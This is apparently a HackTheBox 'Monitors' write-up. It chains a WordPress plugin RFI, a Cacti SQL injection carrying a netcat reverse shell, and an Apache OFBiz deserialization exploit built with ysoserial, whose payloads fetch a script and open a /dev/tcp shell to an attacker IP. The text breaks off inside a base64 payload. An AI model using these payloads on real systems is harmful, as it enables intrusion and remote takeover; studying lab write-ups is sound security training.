# HackTheBox-Monitors Writeup
RFI-SQLi-Deserialization-DockerEscape

![Screen Shot 2021-10-09 at 06 40 29](https://user-images.githubusercontent.com/87259078/136660187-f0165182-b674-4d58-834b-10ec243af387.png)

# Synopsis

“Monitors” is marked as hard difficulty linux machine that features Apache service hosting Wordpress website. The HTML source reveals a Wordpress plugin that is vulnerable to RFI (Remote File Inclusion). Using this vulnerability we read configuration file of Wordpress and apache, the former configuration file has credentials and later has virtual host. Virtual host has a Cacti login (Cacti is a complete network graphing solution designed to harness the power of RRDtool's data storage and graphing functionality) and we use previously collected credentials to login. The Cacti version is vulnerable to SQL Injection due to input validation failure when editing colors and we inject one-liner to gain reverse shell of service account (www-data). Upon enumeration we find certain backup file which has credentials of user, we SSH using those credentials. Linpeas tool gives us an information about docker-proxy on port 8443, upon access it reveals that it is running Apache 9.0.31 and running Apache OFBiz 17.12.01. OFBiz 17.12.01 is vulnerable to unsafe deserialization of XMLRPC arguments, we gain docker container root shell by exploiting the vulnerability. The container has a capability to insert or remove kernel modules in or from the host machine, we gain hosts root by abusing that capability.

# Skills Required

- Web Enumeration
- RFI Exploitation
- SQL Injection
- Docker Enumeration

# Skills Learned

- SQL Injection To Gain Shell
- Manual Deserialization To Gain Shell
- Abusing Docker Capability

# Enumeration

```
⛩\> nmap -sT -sV -sC -Pn -v -oA enum 10.129.142.247
Nmap scan report for 10.129.142.247
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Initial Nmap Scan reveals that target is running SSH, HTTP and Ubuntu OS. Upon cross check of SSH and Apache versions are not vulnerable for any RCE. Let’s Visit the HTTP service.

![Screen Shot 2021-04-28 at 00.31.28.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/20D0AA0F-A676-4DC0-A66E-818CAAA6707F_2/Screen%20Shot%202021-04-28%20at%2000.31.28.png)

As you can see direct IP access is prohibited, so we need to add this IP and respective hostname to our hosts file. Let’s do that.

```
⛩\> sudo sh -c "echo '10.129.142.247   monitors.htb' >> /etc/hosts"
```

Now let’s visit homepage with hostname.

![Screen Shot 2021-04-28 at 00.34.57.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/F1C4054B-A757-42C2-844C-09DF5C642E20_2/Screen%20Shot%202021-04-28%20at%2000.34.57.png)

A wordpress site, version 5.5.1. Lets check the page source.

![Screen Shot 2021-04-28 at 00.36.43.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/364D76B3-03A1-48FF-A1BA-B30C519734A5_2/Screen%20Shot%202021-04-28%20at%2000.36.43.png)

A plugin information is available, let’s do a quick exploit search.

```
⛩\> searchsploit "wp with spritz"
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion                          | php/webapps/44544.php
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We do have an exploit available for this plugin. Let’s read this exploit code.

```
⛩\> cat /usr/share/exploitdb/exploits/php/webapps/44544.php
# Exploit Title: WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion
# Date: 2018-04-25
# Exploit Author: Wadeek
# Software Link: https://downloads.wordpress.org/plugin/wp-with-spritz.zip
# Software Version: 1.0
# Google Dork: intitle:("Spritz Login Success") AND inurl:("wp-with-spritz/wp.spritz.login.success.html")
# Tested on: Apache2 with PHP 7 on Linux
# Category: webapps


1. Version Disclosure

/wp-content/plugins/wp-with-spritz/readme.txt

2. Source Code

if(isset($_GET['url'])){
$content=file_get_contents($_GET['url']);

3. Proof of Concept

/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
```

RFI vulnerability exists due to the GET parameter. Let’s try to read a passwd file.

![Screen Shot 2021-04-28 at 00.49.04.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/561EDDC2-0644-481E-A61D-36618120F31C_2/Screen%20Shot%202021-04-28%20at%2000.49.04.png)

We got passwd content, which reveals a user called marcus. Let’s read wordpress configuration file for any stored credentials.

![Screen Shot 2021-04-28 at 04.39.03.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/55D288E8-0F20-4BF5-AD6C-2208D455794B_2/Screen%20Shot%202021-04-28%20at%2004.39.03.png)

We got DB credentials. I tried these creds on WP login and it didn’t work. Mysql is not available as it is bound to only 127.0.0.1 (localhost).

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Let’s read apache configuration file for any virtual hosts availability.

![Screen Shot 2021-04-29 at 10.57.59.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/646ECAA6-C7C0-485B-B6EF-85F566013806_2/Screen%20Shot%202021-04-29%20at%2010.57.59.png)

We got one virtual host, let’s add this to our hosts file and access the webpage.

![Screen Shot 2021-04-28 at 04.37.05.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/8BDE349E-84A9-4A84-A4B1-2CB61F314060_2/Screen%20Shot%202021-04-28%20at%2004.37.05.png)

Cacti is a complete network graphing solution designed to harness the power of RRDtool's data storage and graphing functionality. Let’s try previously gathered credentials on this login page with admin as username.

![Screen Shot 2021-04-28 at 04.41.04.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/A68F208D-3B49-4F9F-869C-51177A0A40D0_2/Screen%20Shot%202021-04-28%20at%2004.41.04.png)

We got logged in and this running version of cacti is 1.2.12

![Screen Shot 2021-04-28 at 04.43.07.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/03727941-B6F5-4947-8FB3-E488E8117745_2/Screen%20Shot%202021-04-28%20at%2004.43.07.png)

Lets search cacti 1.2.12 for any Vulnerability.

[SQL Injection vulnerability due to input validation failure when editing colors (CVE-2020-14295) · Issue #3622 · Cacti/cacti](https://github.com/Cacti/cacti/issues/3622)

There is a SQL Injection vulnerability exists in colors.php due to input validation failure.

We will use one-liner from [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd). We need to do URL Encoding of our payload. This can be done from the following link. [https://www.w3schools.com/tags/ref_urlencode.ASP](https://www.w3schools.com/tags/ref_urlencode.ASP)

Below is the payload. We have to run this via Burp Suite.

```
/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.14.23+1234+%3E%2Ftmp%2Ff;'+where+name='path_php_binary';--+-
```

**change IP:PORT

If we check out Net Cat Listener we’d see that we got reverse shell.

```
⛩\> nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.143.189] 34570
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We got a service account access not user account. So, we need to first escalate to user account then to root.

Let’s check User Home Directory for any notes/clues to escalate from www-data to user account.

```
www-data@monitors:/usr/share/cacti/cacti$ cd /home
cd /home
www-data@monitors:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root   root   4096 Nov 10 17:00 .
drwxr-xr-x 24 root   root   4096 Apr 21 20:08 ..
drwxr-xr-x  5 marcus marcus 4096 Jan 25 15:39 marcus
www-data@monitors:/home$ cd marcus
cd marcus
www-data@monitors:/home/marcus$ ls -la
ls -la
total 40
drwxr-xr-x 5 marcus marcus 4096 Jan 25 15:39 .
drwxr-xr-x 3 root   root   4096 Nov 10 17:00 ..
d--x--x--x 2 marcus marcus 4096 Nov 10 18:21 .backup
lrwxrwxrwx 1 root   root      9 Nov 10 18:30 .bash_history -> /dev/null
-rw-r--r-- 1 marcus marcus  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 marcus marcus 3771 Apr  4  2018 .bashrc
drwx------ 2 marcus marcus 4096 Jan 25 15:39 .cache
drwx------ 3 marcus marcus 4096 Nov 10 17:00 .gnupg
-rw-r--r-- 1 marcus marcus  807 Apr  4  2018 .profile
-r--r----- 1 root   marcus   84 Jan 25 14:59 note.txt
-r--r----- 1 root   marcus   33 Apr 29 07:12 user.txt
```

In the user (marcus) home directory we have .backup directory, we can’t list the contents of directory but if we know any files from it then can read it via concatenate (cat). Check below image.

```
www-data@monitors:/home/marcus$ cd .backup
cd .backup
www-data@monitors:/home/marcus/.backup$ ls -la
ls -la
ls: cannot open directory '.': Permission denied
```

Let’s search for any files which has ‘Marcus’ string/text in any of the files.

```
www-data@monitors:/tmp$ grep -iRl 'marcus' /etc 2>/dev/null
/etc/group-
/etc/subgid
/etc/group
/etc/passwd
/etc/systemd/system/cacti-backup.service
/etc/subuid
/etc/passwd-
/etc/alternatives/phar.phar
/etc/alternatives/php
/etc/alternatives/phar
www-data@monitors:/tmp$ cat /etc/systemd/system/cacti-backup.service
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target
www-data@monitors:/tmp$ ls -la /home/marcus/.backup/backup.sh
-r-xr-x--- 1 www-data www-data 259 Nov 10 18:21 /home/marcus/.backup/backup.sh
www-data@monitors:/tmp$ cat /home/marcus/.backup/backup.sh
#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
```

As you can see from the above image, we got a service file which has ‘marcus’ string inside of it. If we read the service file, it gives us filename which is inside .backup directory of macrus. Upon reading with cat command it gives us the password. Let’s login into marcus via SSH.

We got our user flag.

```
marcus@monitors:~$ id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
marcus@monitors:~$ cat user.txt
c9b68ee8cf2611e33a9fcd82f75ab3a4
```

# Privilege Escalation

Let’s run linpeas and find any escalation points to root user. Curl and Wget commands are not available on this box, so use net cat to transfer the files from Kali Linux to target box.

```
root       2115  0.0  0.0 553112  3992 ?        Sl   07:12   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443
```

Docker-proxy is being run by root user and it’s has opened 8443 port inside docker container to host and it is bound to 127.0.0.1, so we have to forward the port to our machine (Kali Linux) at some point.

But first, let’s grab the banner of that running port.

```
marcus@monitors:~$ nc 127.0.0.1 8443
HEAD / HTTP/1.0
HTTP/1.1 400
Content-Type: text/plain;charset=UTF-8
Connection: close

Bad Request
This combination of host and port requires TLS.
```

As we already know that TomCat uses this as default port to open SSL text service. Default NC do not support TLS connection. So we have to use OpenSSL to connect the port.

```
marcus@monitors:~$ openssl s_client -connect 127.0.0.1:8443
CONNECTED(00000005)
depth=0 C = US, ST = DE, L = Wilmington, O = Apache Software Fundation, OU = Apache OFBiz, CN = ofbiz-vm.apache.org, emailAddress = dev@ofbiz.apache.org
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = DE, L = Wilmington, O = Apache Software Fundation, OU = Apache OFBiz, CN = ofbiz-vm.apache.org, emailAddress = dev@ofbiz.apache.org
verify return:1

---------------SNIP-------------------

HTTP/1.1 400
Content-Type: text/html;charset=utf-8
Content-Language: en
Content-Length: 1879
Date: Thu, 29 Apr 2021 12:35:53 GMT
Connection: close

----------------SNIP-----------------

</pre><p><b>Note</b> The full stack trace of the root cause is available in the server logs.</p><hr class="line" /><h3>Apache Tomcat/9.0.31</h3></body></html>closed
```

We get two important information from this connection, that certificate is of Apache OFBiz and Apache Tomcat Version is 9.0.31.

Apache OFBiz is an open source enterprise resource planning system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise. OFBiz is an Apache Software Foundation top level project.

When we ran Linpeas previously from output we have the process Information as well as OFBiz version information (17.12.01)

```
root       2359  0.8 17.8 3623344 714920 ?      Sl   07:13   2:55          |   _ /usr/local/openjdk-8/bin/java -Xms128M -Xmx1024M -Dfile.encoding=UTF-8 -Duser.country -Duser.language=en -Duser.variant -cp /usr/src/apache-ofbiz-17.12.01/build/libs/ofbiz.jar org.apache.ofbiz.base.start.Start
```

We can also cross check by visiting the webpage via browser. To do that we need to forward the port to our Kali Linux machine.

```
⛩\> ssh -L 8443:127.0.0.1:8443 marcus@monitors.htb
```

```
⛩\> netstat -antp | grep 8443
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      17110/ssh
tcp6       0      0 ::1:8443                :::*                    LISTEN      17110/ssh
```

As you can see, we have the port running locally on Kali Linux. We can access that port via browser now or scan the port for any information. We can check the default directory/s of OFBiz as mentioned in their wiki.

[Demo and Test Setup Guide - OFBiz Project Open Wiki - Apache Software Foundation](https://cwiki.apache.org/confluence/display/OFBIZ/Demo+and+Test+Setup+Guide)

If we visit the default directory [https://127.0.0.1:8443/webtools/](https://127.0.0.1:8443/webtools/) then it redirect to Following path.

![Screen Shot 2021-04-29 at 05.56.21.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/DDF53AFF-5477-4AC8-91F5-4E1B1092CC43_2/Screen%20Shot%202021-04-29%20at%2005.56.21.png)

They have mentioned default username and password, but it doesn’t work. But we can able to get the version information of OFBiz at bottom right corner of webpage.

![Screen Shot 2021-04-29 at 05.57.06.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/04B5D03D-5114-4744-9C56-2C528698EDC9/A59121FF-9951-4A71-98B1-E42E80EAEF8B_2/Screen%20Shot%202021-04-29%20at%2005.57.06.png)

Upon quick google, we’d get to know that there’s a CVE related to OFBiz (CVE-2020-9496). The following POC code we will use to get shell on the docker container. Although there’s a Metasploit exploit module available for this vulnerability. But I’d stick with manual process to gain shell.

[https://atsud0.me/2021/01/26/CVE-2020-9496漏洞复现/](https://atsud0.me/2021/01/26/CVE-2020-9496%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)

[https://www.youtube.com/watch?v=DO93Xc8sGWg](https://www.youtube.com/watch?v=DO93Xc8sGWg)

For this POC to work we need to drop a shell file and execute/access that file via curl

Create a shell file

```
⛩\> cat shell.sh
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.14.23/8001 0>&1
```

Start an HTTP server

```
⛩\> sudo python3 -m http.server 80
```

Download YsoSerial - A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

[frohoff/ysoserial](https://github.com/frohoff/ysoserial)

Generate payload via ysoserial.jar to download out recently created shell file.

```
⛩\> java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "wget 10.10.14.23/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"
```

Copy the output. Use below curl command to execute our above payload. Paste payload after extensions”>. The below curl command is without payload.

```plaintext
curl https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions"></serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
```

Execute curl command with payload to download our shell.sh file to /tmp directory on target.

```plaintext
curl https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABsDK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAqd2dldCAxMC4xMC4xNC4yMy9zaGVsbC5zaCAtTyAvdG1wL3NoZWxsLnNoCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyMTExNzc5Nzc5MTUxMTAyAQAgTHlzb3NlcmlhbC9Qd25lcjExMTc3OTc3OTE1MTEwMjsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABAAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA==</serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
```

Make sure to get a hit on our HTTP server

```
⛩\> sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.143.189 - - [29/Apr/2021 12:57:07] "GET /shell.sh HTTP/1.1" 200 -
```

File has been downloaded to /tmp directory named as shell.sh. Now to execute that file create payload again.

```
⛩\> java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n"
```

Setup Netcat Listener on Kali

```
⛩\> nc -lvnp 8001
listening on [any] 8001 ...
```

Execute curl command with above payload to execute our shell file.

```plaintext
curl https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqjK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5